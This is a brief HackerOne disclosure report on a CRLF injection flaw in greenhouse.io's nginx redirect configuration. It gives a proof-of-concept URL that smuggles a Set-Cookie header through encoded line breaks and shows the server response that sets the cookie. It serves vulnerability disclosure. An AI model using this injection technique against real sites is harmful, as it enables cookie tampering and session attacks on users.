# HackerOne Report: [greenhouse.io] CRLF Injection / Insecure nginx configuration
**Report ID:** 25275
**Vulnerability Class:** Uncategorized

## Vulnerability Information & PoC
PoC
http://greenhouse.io/%0d%0aSet-Cookie:test=test;domain=.greenhouse.io

HTTP Response:
Location: http://www.greenhouse.io/
Set-Cookie:test=test;domain=.greenhouse.io

Result: 
Creating cookie test=test on .greenhouse.io

$uri or $document_uri is used  in the redirection-URL.

## Discussion & Remediation Timeline
